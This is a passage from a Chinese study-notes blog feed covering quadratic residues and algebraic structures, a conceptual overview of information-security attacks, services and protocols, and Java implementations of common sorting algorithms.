a(\bmod m)$的$x$称为模$m$​的一个平方根。</p></div></li><li><p>性质：</p><ul><li>如果$m$是素数，则整数$1,2,\dots,m-1$中正好有$\frac{m-1}{2}$个是模$m$的二次剩余，其余的$\frac{m-1}{2}$个是模$m$的非二次剩余。</li><li>如果是$a$的模$m$的一个二次剩余，那么$a$恰好有两个平方根，其中一个在$0\sim\frac{m-1}{2}$之间，另一个在$\frac{m-1}{2}\sim m-1$之间。</li><li>如果$m$是两个素数$p$和$q$之积，那么模$m$恰好有$\frac{(p-1)(q-1)}{4}$个二次剩余，有$\frac{3(p-1)(q-1)}{4}$个非二次剩余。</li><li>当$m$是复合数时，如果$m$的分解未知，则求方程$x^2\equiv a(\bmod m)$​的解会很困难。</li></ul>  <details class="folding-tag" ><summary> 求模7的二次剩余 </summary>              <div class='content'>              <p>若$m=7$，模$m$的完全剩余集合为{$1,2,3,4,5,6$}</p><p>$x^2\equiv 1(\bmod 7)$有解，$x=1,x=6$</p><p>$x^2\equiv 2(\bmod 7)$有解，$x=3,x=4$</p><p>$x^2\equiv 3(\bmod 7)$无解</p><p>$x^2\equiv 4(\bmod 7)$有解，$x=2,x=5$</p><p>$x^2\equiv 5(\bmod 7)$无解</p><p>$x^2\equiv 6(\bmod 7)$无解</p><p>由此可见1、2、4为模7的二次剩余，3、5、6是模7的非二次剩余</p>              </div>            </details></li></ul><h2 id="代数基础">代数基础</h2><h3 id="群和环">群和环</h3><h4 id="群">群</h4><ul><li>群定义了一个二元运算的集合，这个二维运算可以表示为$\cdot$（具有一般性，可以指任何数学运算），群$G$记作{$G,\cdot$}，$G$中的每一个序偶$(a,b)$通过运算生成$G$中的元素$(a\cdot b)$​。</li><li>如果一个群的元素个数是有限的，则该群称为有限群。并且群的阶等于群中元素的个数。否则，称该群为无限群。</li><li>满足以下原则：<ul><li>封闭性：如果$a$和$b$都属于$G$，则$a\cdot b$也属于$G$</li><li>结合律：对于$G$中的任何元素$a、b、c$都有$a\cdot (b\cdot c)=(a\cdot b)\cdot c$​成立</li><li>单位元：$G$中存在一个元素$e$，对于$G$中任意元素$a$，都有$a\cdot e=e\cdot a=a$成立</li><li>逆元：对于$G$中任意元素$a$，$G$中都存在一个元素$a^{\prime}$，使得式$a\cdot a^{\prime}=a^{\prime}\cdot a=e$​成立</li><li>交换律：对于$G$中的任意元素$a,b$，都有$a\cdot b=b\cdot a$成立</li></ul></li></ul><h4 id="环">环</h4><ul><li>环是一个有两个二元运算的集合，记作{$R,+,\times$}，这里两个二元运算分别是加法和乘法。从本质上来说，环就是一个集合，可以在其上进行加法、减法和乘法，而不脱离该集合。对于$R$中的任意元素$a、b、c$，满足以下公理：<ul><li>$R$关于加法是一个交换群，即满足<a href="#%E7%BE%A4">群的全部5条原则</a>。对于此种情况下的加法群，用0表示其单位元，$-a$表示$a$的加法逆元。</li><li>乘法的封闭性：如果$a$和$b$都属于$R$，则$ab$也属于$R$</li><li>乘法的结合律：对于$R$中任意元素$a、b、c$，$a(bc)=(ab)c$成立</li><li>分配律：对于$R$中的任意元素$a、b、c$，式$a(b+c)=ab+ac$和式$(a+b)c=ac+bc$总成立</li><li>乘法的交换律：对于$R$中的任意元素$a,b$，有$ab=ba$​成立</li><li>乘法单位元：在$R$中存在元素1，是的对于$R$中的任意元素$a$，有$a1=1a=a$chengli</li><li>无零因子：如果有$R$中元素$a$和$b$，且$ab=0$，则必有$a=0$或$b=0$​</li></ul></li></ul><div class="note info flat"><p>内容更新中……</p></div><h3 id="域和有限域">域和有限域</h3><h4 id="域">域</h4><h4 id="有限域">有限域</h4><h4 id="域上多项式">域上多项式</h4><h4 id="有限域-2">有限域</h4><h2 id="计算复杂性理论">计算复杂性理论</h2><h3 id="问题的复杂性">问题的复杂性</h3><h3 id="算法的复杂性">算法的复杂性</h3><h2 id="单向函数">单向函数</h2>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全技术概述</title>
      <link href="/posts/cdc0c7d.html"/>
      <url>/posts/cdc0c7d.html</url>
      
        <content type="html"><![CDATA[<h2 id="安全攻击">安全攻击</h2><ul><li>安全攻击是<strong>危及信息系统安全的活动</strong>，即<strong>信息在存储、共享和传输中，可能会被非法窃听、截取、篡改和破坏的活动</strong>。</li><li>安全攻击包括两类：<ul><li><strong>被动攻击</strong><ul><li>目的：获得传输的信息，不对信息作任何改动</li><li>威胁信息的保密性</li><li>举例：消息内容的泄漏、流量分析</li></ul></li><li><strong>主动攻击</strong><ul><li>目的：篡改/伪造信息、改变系统的状态和操作</li><li>威胁信息的完整性、可用性和真实性</li><li>举例：伪装、篡改、重放、拒绝服务</li></ul></li></ul></li><li>常见的安全攻击如下：<ul><li><strong>消息内容的泄漏</strong>：消息的内容被泄露或透露给某个非授权的实体</li><li><strong>流量分析</strong>：通过分析通信双方的标识、通信频度、消息格式等信息来达到自己的目的</li><li><strong>篡改</strong>：指对合法用户之间的通信消息进行修改或者改变消息的顺序</li><li><strong>伪装</strong>：指一个实体冒充另一个实体</li><li><strong>重放</strong>：将获得的信息再次发送以期望获得合法用户的利益</li><li><strong>拒绝服务</strong>：指阻止对信息或其他资源的合法访问。</li></ul></li></ul><h2 id="安全机制">安全机制</h2><ul><li>安全机制即<strong>阻止安全攻击及恢复系统的机制</strong>，OSI安全框架将安全机制分为两类：<ul><li><strong>特定安全机制</strong>：<ul><li>描述：在同一时间只针对一种安全服务实施一种技术或软件</li><li>举例：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制和公证</li></ul></li><li><strong>普遍安全机制</strong>：<ul><li>描述：普遍安全机制不能应用到OSI参考模型的任一层上</li><li>举例：可信功能机制、安全标签机制、事件检测机制、审计跟踪机制、安全恢复机制</li></ul></li></ul></li></ul><h2 id="安全目标与安全需求">安全目标与安全需求</h2><h3 id="安全目标">安全目标</h3><ul><li><p>信息安全的目标是指能够满足一个组织或者个人的所有安全需求，通常强调CIA三元组的目标：</p><ul><li>保密性(Confidentiality)</li><li>完整性(Integrity)</li><li>可用性(Availability)</li></ul><p>这三者通常互相矛盾，因此需要在三者中找到一个合适的平衡点。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240222163636013.png" alt="CIA三元组"></p></li></ul><h3 id="安全需求">安全需求</h3><ul><li><p>安全需求包括“CIA三元组”+可追溯性+保障，即：</p><ul><li><strong>保密性</strong>(Confidentiality)：确保信息只被授权人访问</li><li><strong>完整性</strong>(Integrity)：保护信息和信息处理方法的准确性和原始性</li><li><strong>可用性</strong>(Availability)：确保授权的用户在需要时可以访问信息</li><li><strong>可追溯性</strong>(Accountability)：确保实体的行动可被跟踪</li><li><strong>保障</strong>(Assurance)：是对安全措施信任的基础，保障是指系统具有足够的能力保护无意的错误以及能够抵抗故意渗透</li></ul></li><li><p>安全需求之间的关系：</p><ul><li><strong>保密性依赖于完整性</strong>，如果系统没有完整性，保密性就失去意义</li><li><strong>完整性也依赖于保密性</strong>，如果不能保证保密性，完整性也将不能成立</li><li>可用性和可追溯性都由保密性和完整性支持</li><li>上面提到的这些安全需求都依赖于<strong>保障</strong></li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240222163933079.png" alt="安全需求之间的关系"></p></li></ul><h2 id="安全服务模型">安全服务模型</h2><ul><li><p>安全服务是<strong>加强数据处理系统和信息传输的安全性</strong>的一种服务，是指信息系统为其应用提供的某些功能或者辅助业务。安全机制是安全服务的基础，安全服务<strong>利用一种或多种安全机制阻止安全攻击</strong>，保证系统或者数据传输有足够的安全性</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240222165036250.png" alt="综合安全服务模型"></p></li><li><p>模型主要由三个部分组成：<strong>支撑服务</strong>、<strong>预防服务</strong>和<strong>恢复相关服务</strong></p></li></ul><h3 id="支撑服务">支撑服务</h3><ul><li>支撑服务是<strong>其他服务的基础</strong>，主要包括：<ul><li><strong>鉴别</strong>：它表示能够独特地识别系统中所有实体</li><li><strong>密钥管理</strong>：该服务表示以安全的方式管理密钥。密钥常常用于鉴别一个实体</li><li><strong>安全性管理</strong>：系统的所有安全属性必须进行管理。如安装新的服务，更新已有的服务，监控以保证所提供的服务是可操作的</li><li><strong>系统保护</strong>：系统保护通常表示对技术执行的全面信任</li></ul></li></ul><h3 id="预防服务">预防服务</h3><ul><li>预防服务能够<strong>阻止安全漏洞的发生</strong>，包括：<ul><li><strong>受保护的通信</strong>：该服务是保护实体之间的通信</li><li><strong>认证</strong>：保证通信的实体是它所声称的实体，也就是验证实体身份</li><li><strong>授权</strong>：授权表示允许一个实体对一个给定系统作一些行动，如访问一个资源。</li><li><strong>访问控制</strong>：防止非授权使用资源，即控制谁访问资源，在什么条件下访问，能够访问什么等</li><li><strong>不可否认</strong>：它是与责任相关的服务，指发送方和接受方都不能否认发送和接收到的信息。</li><li><strong>交易隐私</strong>：该服务保护任何数字交易的隐私</li></ul></li></ul><h3 id="检测与恢复服务">检测与恢复服务</h3><ul><li><strong>检测与恢复服务</strong>主要是关于安全漏洞的检测，以及采取行动恢复或者降低这些安全漏洞产生的影响，主要包括：<ul><li><strong>审计</strong>：当安全漏洞被检测到时，审计安全相关的事件是非常重要的。它是在系统发现错误或受到攻击时能定位错误和找到攻击成功的原因，以便对系统进行恢复</li><li><strong>入侵检测</strong>：该服务主要监控危害系统安全的可疑行为，以便尽早地采用额外的安全机制来使系统更安全</li><li><strong>整体检验</strong>：整体检验服务主要是检验系统或者数据仍然是否是完整的</li><li><strong>恢复安全状态</strong>：该服务指当安全漏洞发生时，系统必须能够恢复到安全的状态</li></ul></li></ul><h2 id="各部分间的关系">各部分间的关系</h2><h3 id="目标、需求、服务、机制间的关系">目标、需求、服务、机制间的关系</h3><ul><li>全部安全需求的实现才能达到安全目标</li><li>不同的安全服务的联合能够实现不同的安全需求</li><li>一个安全服务可能是多个安全需求的组成要素</li><li>不同的安全机制联合能够完成不同的安全服务</li><li>一个安全机制也可能是多个安全服务的构成要素</li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240222165944087.png" alt="安全目标、安全需求、安全服务和安全机制之间的关系"></p><h3 id="服务与需求的关系">服务与需求的关系</h3><ul><li><p>不是所有的安全需求都强制性地要求所有安全服务</p></li><li><p>安全服务并不是完全可以忽略，因为这些安全服务可能间接地使用</p></li><li><p>可用性依赖于完整性和保密性，保障则与可用性、完整性、保密性和可追溯性相关</p></li><li><p>密钥管理服务影响所有的安全需求</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240222171527974.png" alt="安全服务和安全需求之间的关系"></p></li></ul><h2 id="信息安全模型">信息安全模型</h2><h3 id="网络安全模型">网络安全模型</h3><ul><li><p>通信一方要通过传输系统将消息传送给另一方，由于传输系统提供的信息传输通道是不安全的，所以在将敏感消息通过不安全的通道传给接收方之前，一般先要对消息进行安全变换，以得到一个秘密的安全消息，这样可以防止攻击者危害消息的保密性和真实性。安全秘密消息到达接收方后，再经过安全变换的逆变换，这样秘密消息可被恢复成原始的消息。在大多数情况下，对消息的安全变换是基于密码算法来实现的，在变换过程中使用的密码算法不能被攻击者窃取。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240222171846556.png" alt="网络安全模型"></p></li><li><p>设计安全服务应包括下面四个方面的内容：</p><ul><li>设计一个恰当的安全变换算法，该算法应有足够强安全性，不会被攻击者有效地攻破</li><li>产生安全变换中所需要的秘密信息，如密钥</li><li>设计分配和共享秘密信息的方法</li><li>指明通信双方使用的协议，该协议利用安全算法和秘密信息实现系统所需要安全服务</li></ul></li></ul><h3 id="计算机系统安全模型">计算机系统安全模型</h3><ul><li><p>计算机系统主要存在两类攻击：外部入侵系统、内部对计算机系统的攻击。</p></li><li><p>网络访问信息系统能保护信息系统不受有害的访问，如阻止黑客试图通过网络访问信息系统，或者阻止有意和恶意的破坏，或者阻止恶意软件利用系统的弱点来影响应用程序的正常运行。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240222172722756.png" alt="网络访问信息系统的安全模型"></p></li><li><p>对付有害访问的安全机制分为两类。</p><ul><li>一类是具有门卫功能的守卫者，它包含基于认证的登录过程，只允许授权的实体不越权限地合法使用系统资源；</li><li>另一类称为信息系统内部安全机制，它是用于检测和防止入侵者在突破了守卫者之后对信息系统内部的破坏。</li></ul></li></ul><h2 id="网络安全协议">网络安全协议</h2><ul><li>对TCP/IP参考模型各层分别增加一些安全协议来保证安全，这些安全协议主要分布在最高三层，主要的协议有：<ul><li><strong>网络层</strong>：IPSec</li><li><strong>传输层</strong>：SSL/TLS</li><li><strong>应用层</strong>：SHTTP（Web安全协议）、PGP(电子邮件安全协议)、S/MIME(电子邮件安全协议)、MOSS(电子邮件安全协议)、PEM(电子邮件安全协议)、SSH（远程登录安全协议）、Kerberos(网络认证协议)等</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法中常见的排序方法</title>
      <link href="/posts/d35732cd.html"/>
      <url>/posts/d35732cd.html</url>
      
        <content type="html"><![CDATA[<h2 id="性能分析">性能分析</h2><table><thead><tr><th style="text-align:center">算法</th><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center"><a href="#%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F">冒泡排序</a></td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center"><a href="#%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F">快速排序</a></td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(\log n)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center"><a href="#%E7%AE%80%E5%8D%95%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F">选择排序</a></td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center"><a href="#%E5%A0%86%E6%8E%92%E5%BA%8F">堆排序</a></td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center"><a href="#%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F">插入排序</a></td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center"><a href="#%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F">希尔排序</a></td><td style="text-align:center">$O(n^{1.3})$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center"><a href="#%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F">归并排序</a></td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center"><a href="#%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F">基数排序</a></td><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n\times k)$</td><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center"><a href="#%E6%A1%B6%E6%8E%92%E5%BA%8F">桶排序</a></td><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n+k)$</td><td style="text-align:center">稳定</td></tr></tbody></table><ul><li><strong>稳定性</strong>：在原序列中，<code>r[i]==r[j]</code>且<code>r[i]</code>在<code>r[j]</code>之前，而在排序后的序列中<code>r[i]</code>仍在<code>r[j]</code>之前，则称这种排序算法是稳定的</li></ul><h2 id="交换排序">交换排序</h2><h3 id="冒泡排序（Bubble-Sort）">冒泡排序（Bubble Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>冒泡排序重复地遍历要排序的列表，一次比较相邻两个元素，如果它们的大小顺序错误则进行交换。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.gif" alt="冒泡排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 冒泡排序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n   数组长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// i表示完成排序数字的个数，每一轮排序确认第i+1大的数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 每一轮冒泡排序</span></span><br><span class="line">        <span class="comment">// j控制每次比较的元素位置，每轮排序都会把当前最大的数沉底</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="comment">// 如果前一个数大于后一个数，则交换它们</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="快速排序（Quick-Sort）">快速排序（Quick Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(\log n)$</td><td style="text-align:center">不稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>快速排序是一种常用的排序算法，采用了分治的思想。其基本思路是选择一个基准元素，将小于基准的元素放到基准元素的左边，将大于基准的元素放到基准元素的右边，然后对左右两个子序列分别进行递归排序。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.gif" alt="快速排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快速排序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arr   待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> left  数组的起始索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> right 数组的结束索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">    <span class="comment">// 若右边界大于等于左边界，即还存在需要排序的元素</span></span><br><span class="line">    <span class="keyword">if</span> (right &gt;= left) &#123;</span><br><span class="line">        <span class="comment">// 选择基准值为左边界元素</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">basic</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        <span class="comment">// 定义左右指针</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> right;</span><br><span class="line">        <span class="comment">// 循环直到左右指针相遇</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="comment">// 从右向左找到第一个小于基准值的元素</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt; basic) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果左指针小于右指针，将右指针所指的值赋给左指针，并将左指针右移</span></span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                arr[i] = arr[j];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从左向右找到第一个大于基准值的元素</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt; basic) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果左指针小于右指针，将左指针所指的值赋给右指针，并将右指针左移</span></span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                arr[j] = arr[i];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将基准值放入指针相遇的位置</span></span><br><span class="line">        arr[i] = basic;</span><br><span class="line">        <span class="comment">// 递归调用，对基准值左侧的子数组进行排序</span></span><br><span class="line">        quickSort(arr, left, i - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 递归调用，对基准值右侧的子数组进行排序</span></span><br><span class="line">        quickSort(arr, i + <span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="选择排序">选择排序</h2><h3 id="简单选择排序（Selection-Sort）">简单选择排序（Selection Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>选择排序每次从待排序的数据元素中选择最小（或最大）的一个元素，放到已排好序的数列的最后（或最前），直到所有元素均排好序。</p><p><img src="https://oss.iuoyt.com/img/posts/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F.gif" alt="选择排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 选择排序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 排序后的数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] selectionSort(<span class="type">int</span>[] array) &#123;</span><br><span class="line">    <span class="comment">// 如果数组长度为0，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (array.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 外层循环控制每次选择的起始位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 最小索引初始化为i</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="comment">// 在剩余元素中找到最小值的索引</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; array.length; j++) &#123;</span><br><span class="line">            <span class="comment">// 找到最小的数</span></span><br><span class="line">            <span class="keyword">if</span> (array[j] &lt; array[minIndex]) &#123;</span><br><span class="line">                <span class="comment">// 将最小数的索引保存</span></span><br><span class="line">                minIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 交换当前位置i和最小值的位置minIndex的值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> array[minIndex];</span><br><span class="line">        array[minIndex] = array[i];</span><br><span class="line">        array[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="堆排序（Heap-Sort）">堆排序（Heap Sort）</h3><ol><li><p>性能分析</p><table><thead><tr><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最好情况</th><th style="text-align:center">最差情况</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(n\log n)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr></tbody></table></li><li><p>排序思路</p><p>堆排序利用了堆的数据结构，将待排序的序列构建成一个最大堆（大顶堆或最小堆），然后依次取出堆顶元素（最大值或最小值），并调整剩余元素使之满足堆的性质，最终得到一个有序序列。</p><p><img src="https://oss.iuoyt.com/img/posts/%E5%A0%86%E6%8E%92%E5%BA%8F.gif" alt="堆排序"></p></li><li><p>排序代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 